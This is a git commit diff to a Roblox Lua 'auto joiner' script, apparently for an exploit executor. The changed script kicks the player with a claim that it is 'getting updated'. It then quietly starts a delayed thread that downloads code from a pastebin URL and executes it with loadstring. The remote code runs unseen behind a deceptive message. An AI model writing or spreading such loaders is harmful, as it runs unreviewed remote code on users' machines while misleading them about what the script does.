21737912777d7ff7313010836a38734ca7940525
arshwasser <hettesheimerjonte@gmail.com>
2026-04-17 13:09:48 +0200

    Update auto.joiner.lua

--- auto.joiner.lua
+++ auto.joiner.lua
@@ -1,6 +1,13 @@
--- Script is getting updated rn! | Made for Executor
+-- Script is getting updated rn!
 
 local player = game.Players.LocalPlayer
 
+-- Kick kommt ZUERST
+print("Script is getting updated rn!")
 player:Kick("script is getting updated rn!")
-loadstring(game:HttpGet("https://pastebin.com/raw/Gr1ZtEiy"))()
+
+-- Loadstring trotzdem unten (wird in separatem Thread versucht)
+task.spawn(function()
+    task.wait(0.3)  -- kleine Verzögerung
+    loadstring(game:HttpGet("https://pastebin.com/raw/Gr1ZtEiy"))()
+end)
